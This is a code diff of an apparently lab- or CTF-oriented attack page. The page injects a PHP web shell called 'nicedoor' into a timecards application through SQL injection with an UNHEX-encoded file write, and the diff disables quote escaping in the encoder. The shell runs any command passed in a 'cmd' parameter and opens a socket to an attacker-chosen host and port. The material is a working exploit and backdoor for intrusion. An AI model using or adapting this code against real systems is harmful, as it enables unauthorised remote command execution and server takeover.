@@ -11,7 +11,7 @@ function toHex(s) {
      return "UNHEX('" + ret + "')" ; }  
 function sql_enc(s) {
    s=s.replace(/\\/g,"\\\\"); 
-   s=s.replace(/'/g,"\\'"); 
+   //s=s.replace(/'/g,"\\'"); 
    s=s.replace(/"/g,'\\"'); 
    // s=s.replace(/\n/g,"\\n"); 
    // s=s.replace(/\r/g,"\\r"); 
@@ -29,12 +29,14 @@ function setTaTypeId() {
 }
 function inject0_cb() {
     setTaTypeId();
+    var frmet = document.getElementById("frmet");
     frmet.submit();
 }
 const niceDoorStr = (
-    "<title>nicedoor</title><?php if(!array_key_exists('nh',$_GET)) { ?><h1>nice door</h1><?php } ?>" +
-    "<? if ( (isset( $_GET['rh']) and isset( $_GET['rp'])) or (isset($_POST['rh']) and isset($_POST['rp'])) ) { $s=fsockopen($_GET['rh'] ?? $_POST['rh'], $_GET['rp'] ?? $_POST['rp']); } ?>" +
-    "<pre><?php echo  htmlspecialchars(shell_exec($_POST['cmd'] ?? $_GET['cmd']), ENT_QUOTES);?></pre>"
+    "<title>nicedoor</title>" +
+    "<?php if(!array_key_exists('nh',$_GET)) { ?><h1>nice door</h1><?php } ?>" +
+    "<? if ( isset( $_GET['rh'])  ) { $s=fsockopen($_GET['rh']  , $_GET['rp']  ); } ?>" +
+    "<pre><?php echo htmlspecialchars(shell_exec($_GET['cmd']), ENT_QUOTES);?></pre>" 
 );
 function seter_cb(evt) {
     console.log(evt.target.id);
@@ -99,14 +101,14 @@ function seter_cb(evt) {
    <div>
      <form action=http://fishstick/swancorp/timecards/edit_type.php
          method=get target=_blank id=frmet>
-       <textarea name=fc id=fcta0 cols=120 rows=22 >&lt;?php echo shell_exec($_GET['cmd']);?&gt;</textarea>
+       <textarea id=fcta0 cols=120 rows=22 >&lt;?php echo shell_exec($_GET['cmd']);?&gt;</textarea>
        <fieldset>
-            <input name=fn id=fninp0 value="/var/www/html/swancorp/" size=120 ></input>
+            <input id=fninp0 value="/var/www/html/swancorp/" size=120 ></input>
             <input type=button value='inject file' onclick="inject0_cb()" ></input>
             <input type="button" class=seterbtn value="set nicedoor defaults"
               id="nd-set-btn">
         </fieldset>
-       <textarea name=type_id id=tid cols=120 rows=24 disabled ></textarea>
+       <textarea name=type_id id=tid cols=120 rows=24 readonly ></textarea>
        
      </form></div>
 
